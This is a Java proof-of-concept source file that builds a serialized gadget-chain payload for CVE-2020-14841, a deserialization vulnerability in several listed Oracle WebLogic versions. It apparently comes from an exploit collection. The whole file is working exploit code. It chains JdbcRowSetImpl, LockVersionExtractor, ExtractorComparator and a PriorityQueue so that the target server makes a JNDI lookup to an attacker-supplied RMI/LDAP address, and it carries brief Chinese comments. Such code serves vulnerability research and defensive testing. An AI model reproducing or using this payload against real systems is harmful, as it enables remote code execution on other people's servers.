package com._51pwn.CVE_2020_14841;

import com._51pwn.tools.Tools;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;

// CVE-2020-14841
/*
weblogic 10.3.6.0
weblogic 12.1.3.0
weblogic 12.2.1.3
weblogic 12.2.1.4
*/
public class Main {
    public static void main(String[] args) throws Exception {
        String ldap = args[1];//"rmi://docker.for.mac.localhost:1389/UpX34defineClass";
        JdbcRowSetImpl jdbcRowSet = Tools.GetJdbcRowSetImpl(ldap);
        MethodAttributeAccessor maa = Tools.GetMethodAttributeAccessor("getDatabaseMetaData");
        // LockVersionExtractor:readExternal -> ExternalizableHelper.readObject -> ExternalizableHelper.readObjectInternal -> ExternalizableHelper.readExternalizableLite ->
        //
        LockVersionExtractor lockverion = new LockVersionExtractor(maa, "UnicodeSec");

        // ExtractorComparator:compare -> LockVersionExtractor:extract -> MethodAttributeAccessor:getAttributeValueFromObject ->  this.getMethod.invoke(anObject
        final ExtractorComparator comparator = new ExtractorComparator(lockverion);
        // readObject -> heapify ->siftDown -> comparator != null -> siftDownUsingComparator -> comparator.compare
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // 队列里传入两个jdbcRowSetImpl
        Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);

        // 感觉 这 行多余了
        Reflections.setFieldValue(queue,"comparator",new ExtractorComparator(lockverion));

        Tools.WtOo1(queue);
        System.out.println("write ok");
    }
}
